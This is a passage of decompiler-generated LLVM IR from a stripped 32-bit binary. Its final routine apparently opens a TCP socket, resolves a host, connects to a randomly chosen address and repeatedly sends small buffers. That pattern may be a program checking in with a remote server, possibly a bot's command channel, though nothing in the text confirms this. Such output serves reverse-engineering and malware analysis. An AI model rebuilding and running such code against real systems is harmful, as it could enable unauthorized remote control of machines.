  %v1_8050f2b = add i32 %v0_8050f2b, 4
  %v2_8050f2b = inttoptr i32 %v1_8050f2b to i32*
  store i32 -1, i32* %v2_8050f2b, align 4
  %v0_8050f32 = load i32, i32* @edi, align 4
  %v1_8050f32 = add i32 %v0_8050f32, 284
  %v2_8050f32 = inttoptr i32 %v1_8050f32 to i8*
  store i8 0, i8* %v2_8050f32, align 1
  %v0_8050f39 = load i32, i32* @edi, align 4
  %v1_8050f39 = add i32 %v0_8050f39, 12
  %v2_8050f39 = inttoptr i32 %v1_8050f39 to i32*
  store i32 0, i32* %v2_8050f39, align 4
  br label %dec_label_pc_805052e

dec_label_pc_8050f45:                             ; preds = %dec_label_pc_805044d
  %v3_8050f50 = add nuw nsw i32 %v2_8050f50, 1572
  %v4_8050f50 = add i32 %v3_8050f50, %v0_8050f50
  %v5_8050f50 = inttoptr i32 %v4_8050f50 to i32*
  %v6_8050f50 = load i32, i32* %v5_8050f50, align 4
  %v9_8050f50 = shl i32 1, %v1_8050f4a
  %v12_8050f50 = or i32 %v6_8050f50, %v9_8050f50
  store i32 %v12_8050f50, i32* %v5_8050f50, align 4
  %v0_8050f58 = load i32, i32* @ebx, align 4
  %v1_8050f58 = add i32 %v0_8050f58, 4
  %v2_8050f58 = inttoptr i32 %v1_8050f58 to i32*
  %v3_8050f58 = load i32, i32* %v2_8050f58, align 4
  store i32 %v3_8050f58, i32* %eax.global-to-local, align 4
  %v0_8050f5b = load i32, i32* @esi, align 4
  %v2_8050f5b = sub i32 %v0_8050f5b, %v3_8050f58
  %v8_8050f5b = xor i32 %v0_8050f5b, %v3_8050f58
  %v9_8050f5b = xor i32 %v2_8050f5b, %v0_8050f5b
  %v10_8050f5b = and i32 %v9_8050f5b, %v8_8050f5b
  %v11_8050f5b = icmp slt i32 %v10_8050f5b, 0
  %v13_8050f5b = icmp slt i32 %v2_8050f5b, 0
  %v2_8050f5d = icmp eq i1 %v13_8050f5b, %v11_8050f5b
  br i1 %v2_8050f5d, label %dec_label_pc_8050470, label %dec_label_pc_8050f63

dec_label_pc_8050f63:                             ; preds = %dec_label_pc_8050f45
  store i32 %v3_8050f58, i32* @esi, align 4
  br label %dec_label_pc_8050470

dec_label_pc_8050f70:                             ; preds = %dec_label_pc_805043b
  %v0_8050f70 = load i32, i32* @esp, align 4
  %v1_8050f73 = add i32 %v2_805042d, 4
  %v2_8050f73 = inttoptr i32 %v1_8050f73 to i32*
  %v3_8050f73 = load i32, i32* %v2_8050f73, align 4
  store i32 %v3_8050f73, i32* %edx.global-to-local, align 4
  %v2_8050f76 = add i32 %v0_8050f70, -16
  %v3_8050f76 = inttoptr i32 %v2_8050f76 to i32*
  store i32 %v3_8050f73, i32* %v3_8050f76, align 4
  %v1_8050f77 = call i32 @function_8052191(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050f77, i32* %eax.global-to-local, align 4
  %v0_8050f7f = load i32, i32* @ebx, align 4
  %v1_8050f7f = add i32 %v0_8050f7f, 4
  %v2_8050f7f = inttoptr i32 %v1_8050f7f to i32*
  store i32 -1, i32* %v2_8050f7f, align 4
  %v0_8050f86 = load i32, i32* @ebx, align 4
  %v1_8050f86 = add i32 %v0_8050f86, 12
  %v2_8050f86 = inttoptr i32 %v1_8050f86 to i32*
  %v3_8050f86 = load i32, i32* %v2_8050f86, align 4
  %tmp301 = icmp ult i32 %v3_8050f86, 3
  br i1 %tmp301, label %dec_label_pc_8050fbf, label %dec_label_pc_8050f8c

dec_label_pc_8050f8c:                             ; preds = %dec_label_pc_8050f70
  %v1_8050f8c = add i32 %v0_8050f86, 284
  %v2_8050f8c = inttoptr i32 %v1_8050f8c to i8*
  %v3_8050f8c = load i8, i8* %v2_8050f8c, align 1
  %v4_8050f8c = zext i8 %v3_8050f8c to i32
  %v6_8050f8c = and i32 %v1_8050f77, -256
  %v7_8050f8c = or i32 %v4_8050f8c, %v6_8050f8c
  %v1_8050f92 = add i32 %v7_8050f8c, 1
  %v10_8050f92 = trunc i32 %v1_8050f92 to i8
  store i32 %v1_8050f92, i32* %eax.global-to-local, align 4
  store i8 %v10_8050f92, i8* %v2_8050f8c, align 1
  %v0_8050f99 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f99 = trunc i32 %v0_8050f99 to i8
  %v10_8050f99 = icmp eq i8 %v1_8050f99, 10
  %v0_8050fbf.pre = load i32, i32* @ebx, align 4
  br i1 %v10_8050f99, label %dec_label_pc_8050fbf, label %dec_label_pc_8050f9d

dec_label_pc_8050f9d:                             ; preds = %dec_label_pc_8050f8c
  store i32 %v0_8050fbf.pre, i32* @eax, align 4
  %v0_8050f9f = call i32 @function_804f7b0()
  store i32 %v0_8050f9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050470

dec_label_pc_8050fb0:                             ; preds = %dec_label_pc_8050df1
  %v0_8050fb0 = load i32, i32* @edi, align 4
  store i32 %v0_8050fb0, i32* @eax, align 4
  store i32 -1, i32* @ebp, align 4
  %v0_8050fb5 = call i32 @function_804f7b0()
  store i32 %v0_8050fb5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050fbf:                             ; preds = %dec_label_pc_8050f8c, %dec_label_pc_8050f70
  %v0_8050fbf = phi i32 [ %v0_8050f86, %dec_label_pc_8050f70 ], [ %v0_8050fbf.pre, %dec_label_pc_8050f8c ]
  %v1_8050fbf = add i32 %v0_8050fbf, 284
  %v2_8050fbf = inttoptr i32 %v1_8050fbf to i8*
  store i8 0, i8* %v2_8050fbf, align 1
  %v0_8050fc6 = load i32, i32* @ebx, align 4
  %v1_8050fc6 = add i32 %v0_8050fc6, 12
  %v2_8050fc6 = inttoptr i32 %v1_8050fc6 to i32*
  store i32 0, i32* %v2_8050fc6, align 4
  br label %dec_label_pc_8050470

dec_label_pc_8050fd2:                             ; preds = %dec_label_pc_805041d
  br i1 %v5_8050432, label %dec_label_pc_8050470, label %dec_label_pc_8050fda

dec_label_pc_8050fda:                             ; preds = %dec_label_pc_8050fd2
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805043b

dec_label_pc_8050fe1.loopexit:                    ; preds = %dec_label_pc_8050ef3
  br label %dec_label_pc_8050fe1

dec_label_pc_8050fe1:                             ; preds = %dec_label_pc_8050fe1.loopexit, %dec_label_pc_8050ebd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f0b

dec_label_pc_8050fe8:                             ; preds = %dec_label_pc_8050adc
  %v1_8050fe8 = add i32 %v0_80505c8, 56
  %v2_8050fe8 = inttoptr i32 %v1_8050fe8 to i32*
  %v3_8050fe8 = load i32, i32* %v2_8050fe8, align 4
  store i32 %v3_8050fe8, i32* %eax.global-to-local, align 4
  %v1_8050fec = inttoptr i32 %v3_8050fe8 to i32*
  store i32 104, i32* %v1_8050fec, align 4
  %v0_8050af8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050af8

dec_label_pc_8050ff7:                             ; preds = %dec_label_pc_8050af8
  store i32 %v0_8050ff7, i32* @eax, align 4
  %v0_8050ff9 = call i32 @function_804f7b0()
  store i32 %v0_8050ff9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805052e

dec_label_pc_8051003:                             ; preds = %dec_label_pc_8050aae
  %v11_8051003 = icmp eq i8 %v2_8050aae, -5
  %v1_8051005 = icmp eq i1 %v11_8051003, false
  br i1 %v1_8051005, label %dec_label_pc_805063e, label %dec_label_pc_805100b

dec_label_pc_805100b:                             ; preds = %dec_label_pc_8051003
  store i8 -3, i8* %v1_8050aae, align 1
  %v4_805063e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805063e

dec_label_pc_805102e:                             ; preds = %dec_label_pc_80508ac
  %v1_805102e = add i32 %v0_80508c7, 1
  %v8_805102e = icmp eq i32 %v1_805102e, 0
  store i32 %v1_805102e, i32* %eax.global-to-local, align 4
  br i1 %v8_805102e, label %dec_label_pc_80508d4, label %dec_label_pc_8051035

dec_label_pc_8051035:                             ; preds = %dec_label_pc_805102e
  %v0_8051035 = load i32, i32* @ecx, align 4
  %v1_8051035 = load i32, i32* @esp, align 4
  %v2_8051035 = add i32 %v1_8051035, -4
  %v3_8051035 = inttoptr i32 %v2_8051035 to i32*
  store i32 %v0_8051035, i32* %v3_8051035, align 4
  %v1_8051036 = add i32 %v1_8051035, -8
  %v2_8051036 = inttoptr i32 %v1_8051036 to i32*
  store i32 0, i32* %v2_8051036, align 4
  %v1_8051038 = add i32 %v1_8051035, -12
  %v2_8051038 = inttoptr i32 %v1_8051038 to i32*
  store i32 1, i32* %v2_8051038, align 4
  %v1_805103a = add i32 %v1_8051035, -16
  %v2_805103a = inttoptr i32 %v1_805103a to i32*
  store i32 2, i32* %v2_805103a, align 4
  %v3_805103c = call i32 @function_8052985(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_8051041 = load i32, i32* @esp, align 4
  %v2_8051041 = add i32 %v1_8051041, 48
  %v3_8051041 = inttoptr i32 %v2_8051041 to i32*
  store i32 %v3_805103c, i32* %v3_8051041, align 4
  %v0_8051045 = load i32, i32* @esp, align 4
  %v1_8051048 = add i32 %v3_805103c, 1
  %v8_8051048 = icmp eq i32 %v1_8051048, 0
  store i32 %v1_8051048, i32* @eax, align 4
  %v2_805029b = inttoptr i32 %v0_8051045 to i32*
  br i1 %v8_8051048, label %dec_label_pc_8050298, label %dec_label_pc_805104f

dec_label_pc_805104f:                             ; preds = %dec_label_pc_8051035
  store i32 18, i32* %v2_805029b, align 4
  %v2_8051054 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051054, i32* %eax.global-to-local, align 4
  %v0_8051059 = load i32, i32* @esp, align 4
  %v1_8051059 = inttoptr i32 %v0_8051059 to i32*
  store i32 19, i32* %v1_8051059, align 4
  %v2_8051060 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051060, i32* %eax.global-to-local, align 4
  %v0_8051065 = load i32, i32* @esp, align 4
  %v1_8051065 = inttoptr i32 %v0_8051065 to i32*
  %v2_8051065 = load i32, i32* %v1_8051065, align 4
  store i32 %v2_8051065, i32* %eax.global-to-local, align 4
  %v3_8051065 = add i32 %v0_8051065, 4
  %v1_8051066 = inttoptr i32 %v3_8051065 to i32*
  %v2_8051066 = load i32, i32* %v1_8051066, align 4
  store i32 %v2_8051066, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8051066, align 4
  store i32 18, i32* %v1_8051065, align 4
  %v3_805106b = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805106b, i32* %eax.global-to-local, align 4
  %v1_8051070 = load i32, i32* @esp, align 4
  %v2_8051070 = inttoptr i32 %v1_8051070 to i32*
  store i32 %v3_805106b, i32* %v2_8051070, align 4
  %v2_8051073 = call i32 @function_804f2f0(i8* bitcast (i32* @0 to i8*))
  store i32 %v2_8051073, i32* %eax.global-to-local, align 4
  %v0_8051078 = load i32, i32* @esp, align 4
  store i32 %v2_8051073, i32* @esi, align 4
  %v2_805107d = icmp eq i32 %v2_8051073, 0
  br i1 %v2_805107d, label %dec_label_pc_80508d4, label %dec_label_pc_8051085

dec_label_pc_8051085:                             ; preds = %dec_label_pc_805104f
  %v1_8051085 = add i32 %v0_8051078, 1844
  %v2_8051085 = inttoptr i32 %v1_8051085 to i16*
  store i16 2, i16* %v2_8051085, align 2
  %v2_805108f = add i32 %v2_8051073, 4
  %v3_805108f = inttoptr i32 %v2_805108f to i32*
  %v4_805108f = load i32, i32* %v3_805108f, align 4
  store i32 %v4_805108f, i32* @ebx, align 4
  %v1_8051092 = call i32 @function_804f020(i32 ptrtoint (i32* @0 to i32))
  %v2_8051092 = sext i32 %v1_8051092 to i64
  store i32 %v1_8051092, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051099 = load i32, i32* @esi, align 4
  %v1_8051099 = inttoptr i32 %v0_8051099 to i8*
  %v2_8051099 = load i8, i8* %v1_8051099, align 1
  %v3_8051099 = zext i8 %v2_8051099 to i32
  store i32 %v3_8051099, i32* %ecx.global-to-local, align 4
  %v8_805109f = zext i8 %v2_8051099 to i64
  %v9_805109f = udiv i64 %v2_8051092, %v8_805109f
  %v10_805109f = trunc i64 %v9_805109f to i32
  store i32 %v10_805109f, i32* %eax.global-to-local, align 4
  %v11_805109f = urem i64 %v2_8051092, %v8_805109f
  %v12_805109f = trunc i64 %v11_805109f to i32
  store i32 %v12_805109f, i32* %edx.global-to-local, align 4
  %v0_80510a1 = load i32, i32* @ebx, align 4
  %v2_80510a1 = mul nuw nsw i32 %v12_805109f, 4
  %v3_80510a1 = add i32 %v2_80510a1, %v0_80510a1
  %v4_80510a1 = inttoptr i32 %v3_80510a1 to i32*
  %v5_80510a1 = load i32, i32* %v4_80510a1, align 4
  store i32 %v5_80510a1, i32* %eax.global-to-local, align 4
  %v1_80510a4 = load i32, i32* @esp, align 4
  %v2_80510a4 = add i32 %v1_80510a4, 1832
  %v3_80510a4 = inttoptr i32 %v2_80510a4 to i32*
  store i32 %v5_80510a1, i32* %v3_80510a4, align 4
  %v0_80510ab = load i32, i32* @edi, align 4
  %v1_80510ab = load i32, i32* @esp, align 4
  %v2_80510ab = add i32 %v1_80510ab, -4
  %v3_80510ab = inttoptr i32 %v2_80510ab to i32*
  store i32 %v0_80510ab, i32* %v3_80510ab, align 4
  %v0_80510ac = load i32, i32* @edi, align 4
  %v2_80510ac = add i32 %v1_80510ab, -8
  %v3_80510ac = inttoptr i32 %v2_80510ac to i32*
  store i32 %v0_80510ac, i32* %v3_80510ac, align 4
  %v1_80510ad = add i32 %v1_80510ab, -12
  %v2_80510ad = inttoptr i32 %v1_80510ad to i32*
  store i32 0, i32* %v2_80510ad, align 4
  %v1_80510af = add i32 %v1_80510ab, -16
  %v2_80510af = inttoptr i32 %v1_80510af to i32*
  store i32 19, i32* %v2_80510af, align 4
  %v3_80510b1 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  %v4_80510b1 = inttoptr i32 %v3_80510b1 to i16*
  store i32 %v3_80510b1, i32* %eax.global-to-local, align 4
  %v3_80510b6 = load i16, i16* %v4_80510b1, align 2
  %v4_80510b6 = zext i16 %v3_80510b6 to i32
  %v7_80510b6 = and i32 %v3_80510b1, -65536
  %v8_80510b6 = or i32 %v4_80510b6, %v7_80510b6
  store i32 %v8_80510b6, i32* %eax.global-to-local, align 4
  %v0_80510b9 = load i32, i32* @esi, align 4
  %v1_80510b9 = load i32, i32* @esp, align 4
  %v2_80510b9 = inttoptr i32 %v1_80510b9 to i32*
  store i32 %v0_80510b9, i32* %v2_80510b9, align 4
  %v0_80510bc = load i32, i32* %eax.global-to-local, align 4
  %v1_80510bc = trunc i32 %v0_80510bc to i16
  %v2_80510bc = load i32, i32* @esp, align 4
  %v3_80510bc = add i32 %v2_80510bc, 1846
  %v4_80510bc = inttoptr i32 %v3_80510bc to i16*
  store i16 %v1_80510bc, i16* %v4_80510bc, align 2
  %v1_80510c4 = call i32 @function_804f2b0(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80510c4, i32* %eax.global-to-local, align 4
  %v0_80510c9 = load i32, i32* @esp, align 4
  %v1_80510c9 = inttoptr i32 %v0_80510c9 to i32*
  store i32 18, i32* %v1_80510c9, align 4
  %v2_80510d0 = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80510d0, i32* %eax.global-to-local, align 4
  %v0_80510d5 = load i32, i32* @esp, align 4
  %v1_80510d5 = inttoptr i32 %v0_80510d5 to i32*
  store i32 19, i32* %v1_80510d5, align 4
  %v2_80510dc = call i32 @function_8051220(i8 ptrtoint (i32* @0 to i8))
  %v0_80510e1 = load i32, i32* @esp, align 4
  %v1_80510e1 = add i32 %v0_80510e1, 1844
  store i32 %v1_80510e1, i32* %eax.global-to-local, align 4
  %v1_80510eb = add i32 %v0_80510e1, 8
  %v2_80510eb = inttoptr i32 %v1_80510eb to i32*
  store i32 16, i32* %v2_80510eb, align 4
  %v0_80510ed = load i32, i32* %eax.global-to-local, align 4
  %v2_80510ed = add i32 %v0_80510e1, 4
  %v3_80510ed = inttoptr i32 %v2_80510ed to i32*
  store i32 %v0_80510ed, i32* %v3_80510ed, align 4
  %v1_80510ee = add i32 %v0_80510e1, 48
  %v2_80510ee = inttoptr i32 %v1_80510ee to i32*
  %v3_80510ee = load i32, i32* %v2_80510ee, align 4
  store i32 %v3_80510ee, i32* %esi.global-to-local, align 4
  %v3_80510f2 = inttoptr i32 %v0_80510e1 to i32*
  store i32 %v3_80510ee, i32* %v3_80510f2, align 4
  %v3_80510f3 = call i32 @function_80527aa(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80510f8 = load i32, i32* @esp, align 4
  %v1_80510f8 = add i32 %v0_80510f8, 16
  %v1_80510fb = add i32 %v3_80510f3, 1
  %v8_80510fb = icmp eq i32 %v1_80510fb, 0
  store i32 %v1_80510fb, i32* %eax.global-to-local, align 4
  %v1_80510fc = icmp eq i1 %v8_80510fb, false
  br i1 %v1_80510fc, label %dec_label_pc_8051117, label %dec_label_pc_80510fe

dec_label_pc_80510fe:                             ; preds = %dec_label_pc_8051085
  br label %dec_label_pc_8051101

dec_label_pc_8051101:                             ; preds = %dec_label_pc_8051117, %dec_label_pc_80510fe
  %storemerge4.in = phi i32 [ %v0_80510f8, %dec_label_pc_80510fe ], [ %v0_80511de, %dec_label_pc_8051117 ]
  %v1_8051101 = add i32 %storemerge4.in, 48
  %v2_8051101 = inttoptr i32 %v1_8051101 to i32*
  %v3_8051101 = load i32, i32* %v2_8051101, align 4
  store i32 %v3_8051101, i32* @edi, align 4
  %v3_8051105 = inttoptr i32 %storemerge4.in to i32*
  store i32 %v3_8051101, i32* %v3_8051105, align 4
  %v1_8051106 = call i32 @function_8052191(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051106, i32* @eax, align 4
  %v0_805110b = load i32, i32* @esp, align 4
  %v1_805110b = inttoptr i32 %v0_805110b to i32*
  store i32 0, i32* %v1_805110b, align 4
  %v1_8051112 = call i32 @function_8053cd9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051112, i32* %eax.global-to-local, align 4
  %v0_8051117.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051117

dec_label_pc_8051117:                             ; preds = %dec_label_pc_8051085, %dec_label_pc_8051101
  %v0_8051117 = phi i32 [ %v1_80510f8, %dec_label_pc_8051085 ], [ %v0_8051117.pre, %dec_label_pc_8051101 ]
  %v1_8051117 = add i32 %v0_8051117, 1864
  %v2_8051117 = inttoptr i32 %v1_8051117 to i8*
  store i8 0, i8* %v2_8051117, align 1
  %v0_805111f = load i32, i32* @esp, align 4
  %v1_805111f = add i32 %v0_805111f, -4
  %v2_805111f = inttoptr i32 %v1_805111f to i32*
  store i32 16384, i32* %v2_805111f, align 4
  %v1_8051124 = add i32 %v0_805111f, -8
  %v2_8051124 = inttoptr i32 %v1_8051124 to i32*
  store i32 1, i32* %v2_8051124, align 4
  %v1_8051126 = add i32 %v0_805111f, 1864
  store i32 %v1_8051126, i32* %eax.global-to-local, align 4
  %v2_805112d = add i32 %v0_805111f, -12
  %v3_805112d = inttoptr i32 %v2_805112d to i32*
  store i32 %v1_8051126, i32* %v3_805112d, align 4
  %v1_805112e = add i32 %v0_805111f, 32
  %v2_805112e = inttoptr i32 %v1_805112e to i32*
  %v3_805112e = load i32, i32* %v2_805112e, align 4
  store i32 %v3_805112e, i32* @ebx, align 4
  %v2_8051132 = add i32 %v0_805111f, -16
  %v3_8051132 = inttoptr i32 %v2_8051132 to i32*
  store i32 %v3_805112e, i32* %v3_8051132, align 4
  %v0_8051133 = call i32 @function_80528d4()
  %v0_8051138 = load i32, i32* @esp, align 4
  %v1_8051138 = add i32 %v0_8051138, -4
  %v2_8051138 = inttoptr i32 %v1_8051138 to i32*
  store i32 16384, i32* %v2_8051138, align 4
  %v1_805113d = add i32 %v0_8051138, -8
  %v2_805113d = inttoptr i32 %v1_805113d to i32*
  store i32 4, i32* %v2_805113d, align 4
  %v1_805113f = add i32 %v0_8051138, 1888
  store i32 %v1_805113f, i32* %eax.global-to-local, align 4
  %v2_8051146 = add i32 %v0_8051138, -12
  %v3_8051146 = inttoptr i32 %v2_8051146 to i32*
  store i32 %v1_805113f, i32* %v3_8051146, align 4
  %v1_8051147 = add i32 %v0_8051138, 48
  %v2_8051147 = inttoptr i32 %v1_8051147 to i32*
  %v3_8051147 = load i32, i32* %v2_8051147, align 4
  store i32 %v3_8051147, i32* %ecx.global-to-local, align 4
  %v2_805114b = add i32 %v0_8051138, -16
  %v3_805114b = inttoptr i32 %v2_805114b to i32*
  store i32 %v3_8051147, i32* %v3_805114b, align 4
  %v0_805114c = call i32 @function_80528d4()
  %v0_8051151 = load i32, i32* @esp, align 4
  %v1_8051154 = add i32 %v0_8051151, 28
  %v2_8051154 = inttoptr i32 %v1_8051154 to i32*
  store i32 16384, i32* %v2_8051154, align 4
  %v1_8051159 = add i32 %v0_8051151, 24
  %v2_8051159 = inttoptr i32 %v1_8051159 to i32*
  store i32 2, i32* %v2_8051159, align 4
  %v1_805115b = add i32 %v0_8051151, 1914
  store i32 %v1_805115b, i32* %eax.global-to-local, align 4
  %v2_8051162 = add i32 %v0_8051151, 20
  %v3_8051162 = inttoptr i32 %v2_8051162 to i32*
  store i32 %v1_805115b, i32* %v3_8051162, align 4
  %v1_8051163 = add i32 %v0_8051151, 64
  %v2_8051163 = inttoptr i32 %v1_8051163 to i32*
  %v3_8051163 = load i32, i32* %v2_8051163, align 4
  store i32 %v3_8051163, i32* %edx.global-to-local, align 4
  %v2_8051167 = add i32 %v0_8051151, 16
  %v3_8051167 = inttoptr i32 %v2_8051167 to i32*
  store i32 %v3_8051163, i32* %v3_8051167, align 4
  %v0_8051168 = call i32 @function_80528d4()
  store i32 %v0_8051168, i32* %eax.global-to-local, align 4
  %v0_805116d = load i32, i32* @esp, align 4
  %v1_805116d = add i32 %v0_805116d, -4
  %v2_805116d = inttoptr i32 %v1_805116d to i32*
  store i32 16384, i32* %v2_805116d, align 4
  %v1_8051172 = add i32 %v0_805116d, -8
  %v2_8051172 = inttoptr i32 %v1_8051172 to i32*
  store i32 1, i32* %v2_8051172, align 4
  %v1_8051174 = add i32 %v0_805116d, 52
  %v2_8051174 = inttoptr i32 %v1_8051174 to i32*
  %v3_8051174 = load i32, i32* %v2_8051174, align 4
  %v1_8051178 = add i32 %v3_8051174, 12
  store i32 %v1_8051178, i32* %eax.global-to-local, align 4
  %v2_805117b = add i32 %v0_805116d, -12
  %v3_805117b = inttoptr i32 %v2_805117b to i32*
  store i32 %v1_8051178, i32* %v3_805117b, align 4
  %v1_805117c = add i32 %v0_805116d, 48
  %v2_805117c = inttoptr i32 %v1_805117c to i32*
  %v3_805117c = load i32, i32* %v2_805117c, align 4
  store i32 %v3_805117c, i32* %eax.global-to-local, align 4
  %v2_8051180 = add i32 %v0_805116d, -16
  %v3_8051180 = inttoptr i32 %v2_8051180 to i32*
  store i32 %v3_805117c, i32* %v3_8051180, align 4
  %v0_8051181 = call i32 @function_80528d4()
  %v0_8051186 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805118b = add i32 %v0_8051186, 28
  %v2_805118b = inttoptr i32 %v1_805118b to i32*
  store i32 16384, i32* %v2_805118b, align 4
  %v1_8051190 = add i32 %v0_8051186, 68
  %v2_8051190 = inttoptr i32 %v1_8051190 to i32*
  %v3_8051190 = load i32, i32* %v2_8051190, align 4
  store i32 %v3_8051190, i32* %edx.global-to-local, align 4
  %v1_8051194 = add i32 %v3_8051190, 12
  %v2_8051194 = inttoptr i32 %v1_8051194 to i8*
  %v3_8051194 = load i8, i8* %v2_8051194, align 1
  %v4_8051194 = zext i8 %v3_8051194 to i32
  %v5_8051194 = load i32, i32* %eax.global-to-local, align 4
  %v6_8051194 = and i32 %v5_8051194, -256
  %v7_8051194 = or i32 %v6_8051194, %v4_8051194
  store i32 %v7_8051194, i32* %eax.global-to-local, align 4
  %v2_8051197 = add i32 %v0_8051186, 24
  %v3_8051197 = inttoptr i32 %v2_8051197 to i32*
  store i32 %v7_8051194, i32* %v3_8051197, align 4
  %v0_8051198 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051198 = inttoptr i32 %v0_8051198 to i32*
  %v2_8051198 = load i32, i32* %v1_8051198, align 4
  store i32 %v2_8051198, i32* %eax.global-to-local, align 4
  %v2_805119a = add i32 %v0_8051186, 20
  %v3_805119a = inttoptr i32 %v2_805119a to i32*
  store i32 %v2_8051198, i32* %v3_805119a, align 4
  %v1_805119b = add i32 %v0_8051186, 64
  %v2_805119b = inttoptr i32 %v1_805119b to i32*
  %v3_805119b = load i32, i32* %v2_805119b, align 4
  store i32 %v3_805119b, i32* %eax.global-to-local, align 4
  %v2_805119f = add i32 %v0_8051186, 16
  %v3_805119f = inttoptr i32 %v2_805119f to i32*
  store i32 %v3_805119b, i32* %v3_805119f, align 4
  %v0_80511a0 = call i32 @function_80528d4()
  store i32 %v0_80511a0, i32* %eax.global-to-local, align 4
  %v0_80511a5 = load i32, i32* @esp, align 4
  %v1_80511a5 = add i32 %v0_80511a5, -4
  %v2_80511a5 = inttoptr i32 %v1_80511a5 to i32*
  store i32 16384, i32* %v2_80511a5, align 4
  %v1_80511aa = add i32 %v0_80511a5, -8
  %v2_80511aa = inttoptr i32 %v1_80511aa to i32*
  store i32 1, i32* %v2_80511aa, align 4
  %v1_80511ac = add i32 %v0_80511a5, 52
  %v2_80511ac = inttoptr i32 %v1_80511ac to i32*
  %v3_80511ac = load i32, i32* %v2_80511ac, align 4
  %v1_80511b0 = add i32 %v3_80511ac, 13
  store i32 %v1_80511b0, i32* %eax.global-to-local, align 4
  %v2_80511b3 = add i32 %v0_80511a5, -12
  %v3_80511b3 = inttoptr i32 %v2_80511b3 to i32*
  store i32 %v1_80511b0, i32* %v3_80511b3, align 4
  %v1_80511b4 = add i32 %v0_80511a5, 48
  %v2_80511b4 = inttoptr i32 %v1_80511b4 to i32*
  %v3_80511b4 = load i32, i32* %v2_80511b4, align 4
  store i32 %v3_80511b4, i32* %eax.global-to-local, align 4
  %v2_80511b8 = add i32 %v0_80511a5, -16
  %v3_80511b8 = inttoptr i32 %v2_80511b8 to i32*
  store i32 %v3_80511b4, i32* %v3_80511b8, align 4
  %v0_80511b9 = call i32 @function_80528d4()
  %v0_80511be = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80511c3 = add i32 %v0_80511be, 28
  %v2_80511c3 = inttoptr i32 %v1_80511c3 to i32*
  store i32 16384, i32* %v2_80511c3, align 4
  %v1_80511c8 = add i32 %v0_80511be, 68
  %v2_80511c8 = inttoptr i32 %v1_80511c8 to i32*
  %v3_80511c8 = load i32, i32* %v2_80511c8, align 4
  store i32 %v3_80511c8, i32* %ecx.global-to-local, align 4
  %v1_80511cc = add i32 %v3_80511c8, 13
  %v2_80511cc = inttoptr i32 %v1_80511cc to i8*
  %v3_80511cc = load i8, i8* %v2_80511cc, align 1
  %v4_80511cc = zext i8 %v3_80511cc to i32
  %v5_80511cc = load i32, i32* %eax.global-to-local, align 4
  %v6_80511cc = and i32 %v5_80511cc, -256
  %v7_80511cc = or i32 %v6_80511cc, %v4_80511cc
  store i32 %v7_80511cc, i32* %eax.global-to-local, align 4
  %v2_80511cf = add i32 %v0_80511be, 24
  %v3_80511cf = inttoptr i32 %v2_80511cf to i32*
  store i32 %v7_80511cc, i32* %v3_80511cf, align 4
  %v0_80511d0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80511d0 = add i32 %v0_80511d0, 4
  %v2_80511d0 = inttoptr i32 %v1_80511d0 to i32*
  %v3_80511d0 = load i32, i32* %v2_80511d0, align 4
  store i32 %v3_80511d0, i32* %eax.global-to-local, align 4
  %v2_80511d3 = add i32 %v0_80511be, 20
  %v3_80511d3 = inttoptr i32 %v2_80511d3 to i32*
  store i32 %v3_80511d0, i32* %v3_80511d3, align 4
  %v1_80511d4 = add i32 %v0_80511be, 64
  %v2_80511d4 = inttoptr i32 %v1_80511d4 to i32*
  %v3_80511d4 = load i32, i32* %v2_80511d4, align 4
  store i32 %v3_80511d4, i32* %eax.global-to-local, align 4
  %v2_80511d8 = add i32 %v0_80511be, 16
  %v3_80511d8 = inttoptr i32 %v2_80511d8 to i32*
  store i32 %v3_80511d4, i32* %v3_80511d8, align 4
  %v0_80511d9 = call i32 @function_80528d4()
  store i32 %v0_80511d9, i32* %eax.global-to-local, align 4
  %v0_80511de = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051101

; uselistorder directives
  uselistorder i64 %v8_805109f, { 1, 0 }
  uselistorder i32 %v1_8051092, { 1, 0 }
  uselistorder i32* %v2_805029b, { 1, 0 }
  uselistorder i32 %v2_8050f5b, { 1, 0 }
  uselistorder i32 %v3_8050f58, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050ef4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050ef3, { 1, 0, 2 }
  uselistorder i16 %v1_8050eff, { 1, 0 }
  uselistorder i64 %v8_8050ee0, { 1, 0 }
  uselistorder i32 %v3_8050e73, { 1, 0 }
  uselistorder i32 %v0_8050e73, { 1, 0 }
  uselistorder i32 %v0_8050e6b, { 1, 0 }
  uselistorder i32 %v1_8050d78, { 1, 2, 0 }
